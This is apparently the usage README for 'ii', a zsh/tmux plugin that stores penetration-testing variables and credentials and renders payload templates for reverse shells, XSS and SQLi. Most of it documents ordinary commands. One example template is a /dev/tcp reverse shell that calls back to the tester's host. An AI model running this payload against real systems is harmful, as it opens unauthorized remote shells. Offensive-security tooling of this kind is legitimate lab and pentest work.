# Usage

`ii` stores workflow variables in the current tmux session using the internal
`II_` namespace. User-facing commands use names without that prefix.

## State Model

```text
tmux session environment = shared source across panes
current shell environment = values directly usable in the current pane
payload renderer = always reads fresh tmux session values
```

`ii s` writes to tmux and exports the value into the current shell. `ii l` loads
tmux values into the current shell later. `ii p` renders from tmux directly, so
another pane can render payloads without running `ii l`.

## Commands

| Command | Short form | Purpose |
| --- | --- | --- |
| `ii set NAME VALUE` | `ii s NAME VALUE` | Set internal `II_NAME` in tmux and export `NAME` in this shell |
| `ii set -d [INTERFACE]` | `ii s -d`, `ii s:lhost -d [INTERFACE]` | Detect LHOST from an interface, defaulting to `tun0` |
| `ii set` | `ii s` | Open a TUI to choose common variable names and type a value |
| `ii set FILTER` | `ii s FILTER`, `ii s:FILTER` | Match variable names before setting; `ii s r` jumps to `RHOST` |
| `ii get FILTER` | `ii g FILTER`, `ii g:FILTER` | Print one tmux variable value without loading or copying |
| `ii load` | `ii l` | Load tmux variables into this shell without the internal `II_` prefix |
| `ii clip backend` | | Show or set clipboard backend |
| `ii clip doctor` | | Diagnose clipboard behavior and suggest a backend |
| `ii interactive` | `ii i` | Select variable names with fzf, preview values, edit, delete, add, and copy values |
| `ii ls [PATTERN]` | | List non-empty tmux variables as key/value blocks, optionally filtered by key |
| `ii payload [CATEGORY]` | `ii p [CATEGORY]` | Select, render, copy, and print a payload |
| `ii unset NAME [...]` | `ii u NAME [...]` | Remove `II_` variables from tmux and this shell |
| `ii unset -a` | `ii u -a` | Prompt, then remove all `II_` variables from the current tmux session |
| `ii help [COMMAND]` | `ii h [COMMAND]` | Show help |

## Basic Workflow

Run inside tmux:

```zsh
ii s
ii s LHOST 192.168.45.192
ii s LPORT 443
ii s DOMAIN example.test
ii s USER1 alice
ii s PASSWD1 secret

ii ls
ii ls host
ii ls user
ii p linux
```

`II_` is only an internal tmux namespace. User input is normalized to uppercase,
so `user2` and `USER2` refer to the same tmux variable, `II_USER2`. Shell
exports use names without the prefix, such as `$LHOST` and `$DOMAIN`. `ii set`
and `ii load` export both uppercase and lowercase shell names, such as `$LHOST`
and `$lhost`.

Default names that have not been assigned values are not exported into the
shell.

## Variables

Default variable names:

```text
DOMAIN
LHOST
RHOST
LPORT
RPORT
USER1
PASSWD1
HASH1
USER2
PASSWD2
HASH2
```

`ii s FILTER` resolves matches before asking for a value:

- No matches prints `no matched`.
- One match goes straight to the value prompt.
- Multiple matches open a variable selection prompt.

`ii g FILTER` uses the same case-insensitive name matching and shortcuts as
`ii s FILTER`, but it only prints a value. It does not modify variables, load
values into the shell, or copy anything. Multiple matches open a prompt; Enter
or Space selects one value, while `q`, Esc, or Ctrl-C aborts.

`ii ls` prints non-empty variables as key/value blocks:

```text
LHOST
192.168.45.192

LPORT
443
```

`ii ls PATTERN` filters by key name, case-insensitively:

```zsh
ii ls host
ii ls user
ii ls l
```

## Interactive Variables

`ii i` shows common variable names even when they do not have values yet. The
fzf list shows names with a one-line value preview, and the selected value
appears in the bottom preview.

Keys:

| Key | Action |
| --- | --- |
| `Enter` | Edit the selected variable |
| `Ctrl-S` | Add a variable immediately |
| `Ctrl-X` | Delete the selected variable |
| `Ctrl-Y` | Copy selected existing values |
| `Tab` | Mark multiple values for copy |
| `Esc` / `Ctrl-C` | Abort |

Aborting while editing preserves the original value. A value is replaced only
after confirming with Enter. Clearing a value and confirming stores an empty
value.

`ii i` does not load variables into the shell. Use `ii l` to load all non-empty
variables into the current shell.

## Payloads

Payload files are plain text templates under `II_PAYLOAD_DIR`.

Example:

```text
payloads/
  shell/
    linux/
      sh-tcp
      bash-tcp
      nc-mkfifo
    windows/
      powershell-rev
  script/
    config/
      hosts
    tool/
      ii/
        detect-lhost
      nmap/
        nmap
  xss/
    basic-alert
```

Use `${II_NAME}` placeholders:

```text
/bin/sh -i >/dev/tcp/${II_LHOST}/${II_LPORT} 2>&1 0>&1
```

Files under `payloads/script/` are for custom scripts. They may use
`${II_NAME}` placeholders, or they may use literal shell variables such as
`$rhost`. When no renderable `${II_*}` placeholder is present, `ii p` copies the
script text as-is.

If a payload variable has not been assigned a non-empty tmux value, `ii p`
renders a lowercase shell fallback such as `$rhost` so the copied command can
still be expanded by the shell that runs it.

The payload selector shows a one-line rendered preview in the list. The selected
payload preview reserves separate description and keys blocks around the body.
A first-line `# description: ...` metadata line is shown in preview but omitted
from copied output.

Filter payloads by category:

```zsh
ii p
ii p shell
ii p script
ii p linux
ii p windows
ii p xss
ii p sqli
```

## Payload Directory

By default, the plugin points `II_PAYLOAD_DIR` to the bundled payload directory:

```text
${II_PLUGIN_DIR}/payloads
```

Override it only if you keep payloads somewhere else:

```zsh
export II_PAYLOAD_DIR="$HOME/.config/ii/payloads"
```
